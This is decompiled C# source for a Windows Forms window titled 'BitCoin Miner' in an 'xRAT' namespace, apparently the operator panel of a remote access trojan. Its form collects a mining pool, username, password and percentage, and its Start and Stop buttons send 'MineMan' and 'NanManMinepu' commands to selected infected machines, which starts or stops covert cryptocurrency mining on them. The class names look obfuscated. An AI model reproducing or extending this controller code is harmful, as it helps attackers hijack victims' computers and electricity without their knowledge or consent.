namespace xRAT
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.Runtime.CompilerServices;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class bitcoinn : Form
    {
        [AccessedThroughProperty("Button1")]
        private Button _Button1;
        [AccessedThroughProperty("Button2")]
        private Button _Button2;
        [AccessedThroughProperty("Label1")]
        private Label _Label1;
        [AccessedThroughProperty("Label2")]
        private Label _Label2;
        [AccessedThroughProperty("Label3")]
        private Label _Label3;
        [AccessedThroughProperty("Label4")]
        private Label _Label4;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        [AccessedThroughProperty("TextBox2")]
        private TextBox _TextBox2;
        [AccessedThroughProperty("TextBox3")]
        private TextBox _TextBox3;
        [AccessedThroughProperty("TextBox4")]
        private TextBox _TextBox4;
        private IContainer icontainer_0;

        public bitcoinn()
        {
            Class1.QaIGh5M7cuigS();
            this.InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            try
            {
                Class2.Class4_0.method_6().SendToSelected("MineMan|" + this.TextBox1.Text + "|" + this.TextBox2.Text + "|" + this.TextBox3.Text + "|" + this.TextBox4.Text);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            try
            {
                Class2.Class4_0.method_6().SendToSelected("NanManMinepu");
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(bitcoinn));
            this.Label1 = new Label();
            this.Label2 = new Label();
            this.Label3 = new Label();
            this.Label4 = new Label();
            this.TextBox1 = new TextBox();
            this.TextBox2 = new TextBox();
            this.TextBox3 = new TextBox();
            this.TextBox4 = new TextBox();
            this.Button1 = new Button();
            this.Button2 = new Button();
            this.SuspendLayout();
            this.Label1.AutoSize = true;
            Point point = new Point(0x15, 0x8f);
            this.Label1.Location = point;
            this.Label1.Name = "Label1";
            Size size = new Size(0x42, 13);
            this.Label1.Size = size;
            this.Label1.TabIndex = 0;
            this.Label1.Text = "Percentage:";
            this.Label2.AutoSize = true;
            point = new Point(0x13, 8);
            this.Label2.Location = point;
            this.Label2.Name = "Label2";
            size = new Size(0x1f, 13);
            this.Label2.Size = size;
            this.Label2.TabIndex = 1;
            this.Label2.Text = "Pool:";
            this.Label3.AutoSize = true;
            point = new Point(0x13, 0x34);
            this.Label3.Location = point;
            this.Label3.Name = "Label3";
            size = new Size(0x3b, 13);
            this.Label3.Size = size;
            this.Label3.TabIndex = 2;
            this.Label3.Text = "Username:";
            this.Label4.AutoSize = true;
            point = new Point(0x15, 0x61);
            this.Label4.Location = point;
            this.Label4.Name = "Label4";
            size = new Size(0x39, 13);
            this.Label4.Size = size;
            this.Label4.TabIndex = 3;
            this.Label4.Text = "Password:";
            point = new Point(13, 0x18);
            this.TextBox1.Location = point;
            this.TextBox1.Name = "TextBox1";
            size = new Size(0xbd, 0x15);
            this.TextBox1.Size = size;
            this.TextBox1.TabIndex = 4;
            point = new Point(12, 0x44);
            this.TextBox2.Location = point;
            this.TextBox2.Name = "TextBox2";
            size = new Size(0xbd, 0x15);
            this.TextBox2.Size = size;
            this.TextBox2.TabIndex = 5;
            point = new Point(12, 0x71);
            this.TextBox3.Location = point;
            this.TextBox3.Name = "TextBox3";
            size = new Size(0xbd, 0x15);
            this.TextBox3.Size = size;
            this.TextBox3.TabIndex = 6;
            point = new Point(12, 0xa2);
            this.TextBox4.Location = point;
            this.TextBox4.Name = "TextBox4";
            size = new Size(0xbd, 0x15);
            this.TextBox4.Size = size;
            this.TextBox4.TabIndex = 7;
            point = new Point(12, 0xbb);
            this.Button1.Location = point;
            this.Button1.Name = "Button1";
            size = new Size(190, 0x23);
            this.Button1.Size = size;
            this.Button1.TabIndex = 8;
            this.Button1.Text = ":: Start Miner ::";
            this.Button1.UseVisualStyleBackColor = true;
            point = new Point(12, 0xe4);
            this.Button2.Location = point;
            this.Button2.Name = "Button2";
            size = new Size(0xbd, 0x23);
            this.Button2.Size = size;
            this.Button2.TabIndex = 9;
            this.Button2.Text = ":: Stop Miner ::";
            this.Button2.UseVisualStyleBackColor = true;
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            size = new Size(0xda, 0x116);
            this.ClientSize = size;
            this.Controls.Add(this.Button2);
            this.Controls.Add(this.Button1);
            this.Controls.Add(this.TextBox4);
            this.Controls.Add(this.TextBox3);
            this.Controls.Add(this.TextBox2);
            this.Controls.Add(this.TextBox1);
            this.Controls.Add(this.Label4);
            this.Controls.Add(this.Label3);
            this.Controls.Add(this.Label2);
            this.Controls.Add(this.Label1);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.Name = "bitcoinn";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "BitCoin Miner";
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private void TextBox2_TextChanged(object sender, EventArgs e)
        {
        }

        private void TextBox3_TextChanged(object sender, EventArgs e)
        {
        }

        private void TextBox4_TextChanged(object sender, EventArgs e)
        {
        }

        internal virtual Button Button1
        {
            get
            {
                return this._Button1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button1_Click);
                if (this._Button1 != null)
                {
                    this._Button1.Click -= handler;
                }
                this._Button1 = value;
                if (this._Button1 != null)
                {
                    this._Button1.Click += handler;
                }
            }
        }

        internal virtual Button Button2
        {
            get
            {
                return this._Button2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button2_Click);
                if (this._Button2 != null)
                {
                    this._Button2.Click -= handler;
                }
                this._Button2 = value;
                if (this._Button2 != null)
                {
                    this._Button2.Click += handler;
                }
            }
        }

        internal virtual Label Label1
        {
            get
            {
                return this._Label1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label1 = value;
            }
        }

        internal virtual Label Label2
        {
            get
            {
                return this._Label2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label2 = value;
            }
        }

        internal virtual Label Label3
        {
            get
            {
                return this._Label3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label3 = value;
            }
        }

        internal virtual Label Label4
        {
            get
            {
                return this._Label4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label4 = value;
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return this._TextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox1 = value;
            }
        }

        internal virtual TextBox TextBox2
        {
            get
            {
                return this._TextBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.TextBox2_TextChanged);
                if (this._TextBox2 != null)
                {
                    this._TextBox2.TextChanged -= handler;
                }
                this._TextBox2 = value;
                if (this._TextBox2 != null)
                {
                    this._TextBox2.TextChanged += handler;
                }
            }
        }

        internal virtual TextBox TextBox3
        {
            get
            {
                return this._TextBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.TextBox3_TextChanged);
                if (this._TextBox3 != null)
                {
                    this._TextBox3.TextChanged -= handler;
                }
                this._TextBox3 = value;
                if (this._TextBox3 != null)
                {
                    this._TextBox3.TextChanged += handler;
                }
            }
        }

        internal virtual TextBox TextBox4
        {
            get
            {
                return this._TextBox4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.TextBox4_TextChanged);
                if (this._TextBox4 != null)
                {
                    this._TextBox4.TextChanged -= handler;
                }
                this._TextBox4 = value;
                if (this._TextBox4 != null)
                {
                    this._TextBox4.TextChanged += handler;
                }
            }
        }
    }
}

